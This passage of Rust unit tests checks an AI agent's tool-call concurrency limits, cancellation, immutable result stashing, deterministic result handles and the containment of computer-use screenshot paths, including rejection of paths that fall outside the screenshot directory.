                Some(gate.clone()),
                false,
            );
            calls.push(make_tc(&name, &index.to_string()));
        }
        let execution = run_probe_calls(&registry, &calls, None);
        let release = async {
            tokio::time::timeout(
                Duration::from_secs(1),
                state.wait_for_started(MAX_PARALLEL_TOOL_CALLS),
            )
            .await
            .expect("initial bounded batch did not start");
            tokio::task::yield_now().await;
            assert_eq!(
                state.started.load(Ordering::SeqCst),
                MAX_PARALLEL_TOOL_CALLS
            );
            gate.cancel();
        };
        let (results, ()) = tokio::join!(execution, release);
        assert_eq!(results.len(), MAX_PARALLEL_TOOL_CALLS + 2);
        assert_eq!(state.peak.load(Ordering::SeqCst), MAX_PARALLEL_TOOL_CALLS);
    }

    #[tokio::test]
    async fn cancellation_skips_queued_underlying_calls_but_returns_every_receipt() {
        let state = ProbeState::new();
        let gate = tokio_util::sync::CancellationToken::new();
        let cancellation = tokio_util::sync::CancellationToken::new();
        let mut registry = ToolRegistry::new();
        let mut calls = Vec::new();
        for index in 0..MAX_PARALLEL_TOOL_CALLS + 2 {
            let name = format!("safe_{index}");
            register_probe(
                &mut registry,
                &name,
                ToolConcurrency::ParallelSafe,
                &state,
                Some(gate.clone()),
                false,
            );
            calls.push(make_tc(&name, &index.to_string()));
        }
        let execution = run_probe_calls(&registry, &calls, Some(cancellation.clone()));
        let cancel = async {
            tokio::time::timeout(
                Duration::from_secs(1),
                state.wait_for_started(MAX_PARALLEL_TOOL_CALLS),
            )
            .await
            .expect("initial bounded batch did not start");
            cancellation.cancel();
        };
        let (results, ()) = tokio::join!(execution, cancel);
        assert_eq!(results.len(), MAX_PARALLEL_TOOL_CALLS + 2);
        assert_eq!(
            state.started.load(Ordering::SeqCst),
            MAX_PARALLEL_TOOL_CALLS
        );
        assert!(results.iter().all(|result| !result.result.ok()));
        assert!(results
            .iter()
            .all(|result| result.result.data().contains("cancelled")));
    }

    /// STEP 1 invariant test: the tool-result stash must be IMMUTABLE — a
    /// second store under the same `(session_id, tool_call_id)` with DIFFERENT
    /// bytes is a Conflict and MUST NOT overwrite the original body. A handle
    /// that referenced the second bytes while the first remained stored would
    /// be a lying handle (the cache-desync class this uproot kills).
    #[tokio::test]
    async fn stash_tool_result_rejects_conflicting_bytes_not_overwrite() {
        use crate::session::db::StoredResult;

        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let session = sessions.create_session("cli:stash-conflict").await;
        let sid = session.id.clone();

        let body_a = "alpha\n".repeat(2000);
        let body_b = "beta\n".repeat(2000);

        // First write under (sid, "tc_1") with body_a — Stored (or Identical).
        let first = stash_tool_result_for_prompt_shaping(
            &sessions,
            &sid,
            "tc_1",
            "read_file",
            &body_a,
            4096,
            true, // force: the cap gate is a no-op so we exercise the store path
        )
        .await
        .expect("first stash of a fresh key must succeed");
        assert!(
            first,
            "force=true on a >cap body must report it was newly stashed"
        );

        // Second write under the SAME key with DIFFERENT bytes: Conflict, NOT
        // an overwrite. The function surfaces the failure as Err(StoredResult).
        let conflict = stash_tool_result_for_prompt_shaping(
            &sessions,
            &sid,
            "tc_1",
            "read_file",
            &body_b,
            4096,
            true,
        )
        .await
        .expect_err("a different-bytes retry must surface as Err(Conflict), not Ok");
        match conflict {
            StoredResult::Conflict {
                existing_digest,
                attempted_digest,
            } => {
                assert_ne!(
                    existing_digest, attempted_digest,
                    "conflict must report distinct digests"
                );
            }
            other => panic!("expected Conflict, got {other:?}"),
        }

        // The stored body is still body_a — never overwritten by body_b.
        assert_eq!(
            sessions.load_tool_result(&sid, "tc_1").await.as_deref(),
            Some(body_a.as_str()),
            "conflicting write must not replace the stored body"
        );
    }

    #[tokio::test]
    async fn ordinary_result_size_classes_store_before_rendering_handles() {
        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let session = sessions.create_session("cli:handle-size-classes").await;
        let args = HashMap::new();

        for (index, size) in [0usize, 2, 7_400, 8_000, 172_000].into_iter().enumerate() {
            let body = "x".repeat(size);
            let id = format!("call_size_{index}");
            let rendered = store_then_render_tool_result(
                &sessions,
                &session.id,
                &id,
                "web_fetch",
                &args,
                &body,
                true,
                4_096,
            )
            .await
            .expect("ordinary result must be stored before rendering");

            // Hybrid exposure: small results inline (cache-stable bytes, no
            // inspect round-trip), large results stay handles.
            if size <= crate::agent::context_hygiene::INLINE_TOOL_RESULT_MAX_BYTES {
                assert_eq!(
                    rendered, body,
                    "size {size} must inline the exact body under the hybrid"
                );
            } else {
                assert!(
                    rendered.starts_with(TOOL_RESULT_HANDLE_MARKER),
                    "size {size} must use the ordinary handle wire: {rendered}"
                );
            }
            assert_eq!(
                sessions.load_tool_result(&session.id, &id).await.as_deref(),
                Some(body.as_str()),
                "size {size} must remain losslessly recoverable"
            );
        }
    }

    #[tokio::test]
    async fn full_retrieval_never_replays_its_raw_body_into_context() {
        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let session = sessions.create_session("cli:no-raw-retrieval-replay").await;
        let body = format!(
            "header\n{}\nfooter",
            "NYT_HTML_MUST_STAY_STASHED\n".repeat(300)
        );

        let rendered = store_then_render_tool_result(
            &sessions,
            &session.id,
            "call_recall",
            "recall_tool_result",
            &HashMap::new(),
            &body,
            true,
            10_000,
        )
        .await
        .expect("exact retrieval body must be stashed");

        assert!(
            rendered.starts_with(TOOL_RESULT_HANDLE_MARKER),
            "model history must receive a receipt, never a full retrieval excerpt: {rendered}"
        );
        assert!(
            !rendered.contains("NYT_HTML_MUST_STAY_STASHED"),
            "the exact body belongs only in SQLite"
        );
        assert_eq!(
            sessions
                .load_tool_result(&session.id, "call_recall")
                .await
                .as_deref(),
            Some(body.as_str()),
            "the exact body remains recoverable from the immutable stash"
        );
    }

    #[tokio::test]
    async fn inspection_is_the_only_bounded_readable_result_projection() {
        let temp = tempfile::tempdir().unwrap();
        let sessions = crate::session::SessionDb::new(&temp.path().join("sessions.db"));
        let session = sessions.create_session("cli:bounded-inspection").await;
        let body = format!("MATCHED_LINE\n{}", "unrelated line\n".repeat(2_000));

        let rendered = store_then_render_tool_result(
            &sessions,
            &session.id,
            "call_inspect",
            "inspect_tool_result",
            &HashMap::new(),
            &body,
            true,
            10_000,
        )
        .await
        .expect("inspection result must be stored before projection");

        assert!(
            rendered.starts_with(TOOL_RESULT_EXCERPT_MARKER),
            "inspection is the single bounded readable projection: {rendered}"
        );
        assert!(rendered.contains("MATCHED_LINE"));
        assert!(
            rendered.chars().count() <= TOOL_RESULT_INSPECTION_MAX_CHARS,
            "the configured result limit must not bypass the inspection ceiling"
        );
    }

    /// STEP 2: the canonical handle must be a pure deterministic function of
    /// (id, tool, ok, stored_bytes, args). Same inputs → byte-identical output
    /// across calls (write-once-stable → no prefix-cache drift). The full body
    /// must NOT be a substring of the handle (handles carry only a tiny
    /// excerpt; the body lives in the stash).
    #[test]
    fn render_tool_result_handle_is_deterministic_and_hides_body() {
        let body = "line one with specific content\nline two\nline three";
        let mut args = HashMap::new();
        args.insert("path".to_string(), Value::String("src/main.rs".to_string()));
        args.insert(
            "ignored_thing".to_string(),
            Value::String("should not appear".to_string()),
        );

        let h1 = render_tool_result_handle("call_42", "read_file", true, body.as_bytes(), &args);
        let h2 = render_tool_result_handle("call_42", "read_file", true, body.as_bytes(), &args);
        assert!(h1.contains("total_chars:"));
        assert!(h1.contains(r#"first_read:{"tool_call_id":"call_42","start_char":0}"#));

        assert_eq!(h1, h2, "handle must be byte-identical across calls");
        assert!(
            h1.starts_with("TOOL_RESULT_HANDLE v1 |"),
            "handle must start with the canonical versioned marker; got: {h1}"
        );
        // The body's specific content is NOT in the handle — only a tiny
        // single-line excerpt and metadata.
        assert!(
            !h1.contains("line two"),
            "the full body must not be a substring of the handle; got: {h1}"
        );
        assert!(
            !h1.contains("line three"),
            "the full body must not be a substring of the handle; got: {h1}"
        );
        // The handle points the model at inspect_tool_result for a bounded part.
        assert!(
            h1.contains("inspect_tool_result") && h1.contains("call_42"),
            "handle must reference inspect_tool_result and the id; got: {h1}"
        );
        // The deterministic args summary includes the allowlisted scalar (path)
        // but NOT non-allowlisted fields.
        assert!(
            h1.contains("src/main.rs"),
            "handle must include the path arg; got: {h1}"
        );
        assert!(
            !h1.contains("should not appear"),
            "handle must not include non-allowlisted args; got: {h1}"
        );
        // The excerpt is the first non-empty line, bounded.
        assert!(
            h1.contains("line one with specific content"),
            "handle must include the first-line excerpt; got: {h1}"
        );
    }

    /// The handle excerpt must be whitespace-normalized and char-capped — a
    /// first line with embedded newlines or huge length must not bloat the
    /// handle or drift across renders.
    #[test]
    fn render_tool_result_handle_excerpt_is_normalized_and_capped() {
        let body = "    \n   first    line   with   spaces   \nsecond\n";
        let args = HashMap::new();
        let h = render_tool_result_handle("c1", "exec", true, body.as_bytes(), &args);
        // The excerpt skipped the whitespace-only first line, took the second,
        // and collapsed internal whitespace runs.
        assert!(
            h.contains("first line with spaces"),
            "excerpt must skip blank leading lines and collapse whitespace; got: {h}"
        );
        // Char cap: a very long first line is truncated.
        let long_line: String = std::iter::repeat('x').take(500).collect();
        let body_long = long_line.clone();
        let h2 = render_tool_result_handle("c2", "exec", true, body_long.as_bytes(), &args);
        // The handle itself stays small — well under the body size.
        assert!(
            h2.len() < 600,
            "handle with a 500-char first line must stay small; got len={}",
            h2.len()
        );
    }

    const PNG_B64: &str = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

    #[test]
    fn test_cua_screenshot_candidate_detects_marker() {
        let ws = std::path::Path::new("/tmp/ws");
        let shot = "/tmp/ws/cua/cua-tc_1.png";
        let data = format!("click OK\n\nScreenshot saved: {shot}");
        let got = cua_screenshot_candidate("cua", true, true, &data, ws);
        assert_eq!(got.as_deref(), Some(std::path::Path::new(shot)));
    }

    #[test]
    fn test_cua_screenshot_candidate_skips_without_marker() {
        let ws = std::path::Path::new("/tmp/ws");
        let got = cua_screenshot_candidate("cua", true, true, "click OK", ws);
        assert_eq!(got, None);
    }

    #[test]
    fn test_cua_screenshot_candidate_skips_non_cua_tool() {
        let ws = std::path::Path::new("/tmp/ws");
        let data = "Screenshot saved: /tmp/ws/cua/x.png";
        let got = cua_screenshot_candidate("read_file", true, true, data, ws);
        assert_eq!(got, None);
    }

    #[test]
    fn test_cua_screenshot_candidate_skips_on_failure() {
        let ws = std::path::Path::new("/tmp/ws");
        let data = "Screenshot saved: /tmp/ws/cua/x.png";
        let got = cua_screenshot_candidate("cua", false, true, data, ws);
        assert_eq!(got, None);
    }

    #[test]
    fn test_cua_screenshot_candidate_skips_without_vision() {
        let ws = std::path::Path::new("/tmp/ws");
        let data = "Screenshot saved: /tmp/ws/cua/x.png";
        let got = cua_screenshot_candidate("cua", true, false, data, ws);
        assert_eq!(got, None);
    }

    #[test]
    fn test_cua_screenshot_candidate_skips_path_outside_cua_dir() {
        let ws = std::path::Path::new("/tmp/ws");
        let data = "Screenshot saved: /tmp/evil.png";
        let got = cua_screenshot_candidate("cua", true, true, data, ws);
        assert_eq!(got, None);
    }

    #[test]
    fn read_only_classification_bounds_the_post_exhaustion_auto_renewal() {
        // Auto-renewal after lease exhaustion is keyed to this set: members
        // keep reading, everything else must checkpoint or answer. Pure local
        // reads qualify — including re-reading bytes this session already
        // stashed and enumerating tool definitions. Network and side-effect
        // tools stay budgeted: bounding their loops is the lease's job.
        for name in [
            "read_file",
            "list_dir",
            "find_files",
            "search_files",
            "file_info",
            "file_preview",
            "get_skills",
            "inspect_tool_result",
            "get_tools",
        ] {
            assert!(is_read_only_tool(name), "{name} must auto-renew");
        }
        for name in [
            "web_search",
            "web_fetch",
            "exec",
            "write_file",
            "recall",
            "remember",
        ] {
            assert!(!is_read_only_tool(name), "{name} must stay budgeted");
        }
    }

    #[test]
    fn test_cua_screenshot_candidate_skips_relative_path() {
        let ws = std::path::Path::new("/tmp/ws");
        let data = "Screenshot saved: cua/relative.png";
        let got = cua_screenshot_candidate("cua", true, true, data, ws);
        assert_eq!(got, None);
    }

    #[test]
    fn test_cua_screenshot_candidate_skips_parent_dir_component() {
        let ws = std::path::Path::new("/tmp/ws");
        let data = "Screenshot saved: /tmp/ws/cua/../evil.png";
        let got = cua_screenshot_candidate("cua", true, true, data, ws);
        assert_eq!(got, None);
    }

    /// IO shell: real file ≤ 10 MiB → image turn appended with a base64
    /// roundtrip. Uses a plain Vec<Value> — no TurnContext required.
    #[tokio::test]
    async fn test_append_cua_screenshot_turn_embeds_image() {
        let dir = tempfile::tempdir().unwrap();
        let shot = dir.path().join("cua-tc_1.png");
        let png = base64::engine::general_purpose::STANDARD
            .decode(PNG_B64)
            .unwrap();
        std::fs::write(&shot, &png).unwrap();

        let mut messages: Vec<serde_json::Value> = Vec::new();
        append_cua_screenshot_turn(&mut messages, shot.clone()).await;

        let last = messages.last().unwrap();
        assert_eq!(last["role"], "user");
        let content = last["content"].as_array().unwrap();
        assert_eq!(content[0]["type"], "text");
        assert!(content[0]["text"]
            .as_str()
            .unwrap()
            .contains("cua screenshot"));
        assert_eq!(content[1]["type"], "image_url");
        let url = content[1]["image_url"]["url"].as_str().unwrap();
        assert!(url.starts_with("data:image/png;base64,"), "got: {url}");
        let b64 = url.trim_start_matches("data:image/png;base64,");
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(b64)
            .unwrap();
        assert_eq!(decoded, png);
        // The turn must be `_synthetic` (and NOT `_cache_replay`) so the
        // persist machinery keeps the base64 image in-memory only — never in
        // the session DB, never reloaded into later turns.
        assert_eq!(last["_synthetic"], true);
        assert_eq!(last["_cache_replay"], serde_json::Value::Null);
    }

    /// IO shell: file missing → nothing appended.
    #[tokio::test]
    async fn test_append_cua_screenshot_turn_missing_file() {
        let mut messages: Vec<serde_json::Value> = Vec::new();
        append_cua_screenshot_turn(
            &mut messages,
            std::path::PathBuf::from("/nonexistent/x.png"),
        )
        .await;
        assert!(messages.is_empty());
    }

    /// IO shell: oversized file (> 10 MiB) → nothing appended.
    #[tokio::test]
    async fn test_append_cua_screenshot_turn_oversized() {
        let dir = tempfile::tempdir().unwrap();
        let shot = dir.path().join("big.png");
        std::fs::write(&shot, vec![0u8; 10 * 1024 * 1024 + 1]).unwrap();

        let mut messages: Vec<serde_json::Value> = Vec::new();
        append_cua_screenshot_turn(&mut messages, shot).await;
        assert!(messages.is_empty());
    }
}
